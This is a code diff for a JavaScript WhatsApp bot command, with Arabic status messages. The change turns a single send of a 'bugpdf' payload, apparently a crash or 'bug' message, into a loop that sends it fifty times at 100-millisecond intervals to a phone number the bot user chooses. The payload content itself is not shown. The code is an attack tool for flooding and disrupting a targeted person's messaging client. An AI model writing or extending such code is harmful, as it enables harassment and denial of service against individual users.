@@ -13,11 +13,14 @@ module.exports = async ({ sock, msg, text, reply }) => {
   const jid = `${number}@s.whatsapp.net`;
 
   try {
-    await sock.sendMessage(jid, {
-      text: bugpdf
-    });
+    for (let i = 0; i < 50; i++) {
+      await sock.sendMessage(jid, { text: bugpdf });
 
-    await reply(`✅ تم إرسال BugPDF إلى: ${number}`);
+      // فاصل زمني 100 ميلي ثانية
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+
+    await reply(`✅ تم إرسال BugPDF عدد 50 مرة إلى: ${number}`);
   } catch (err) {
     console.error(err);
     await reply(`❌ فشل في إرسال الرسالة إلى: ${number}`);
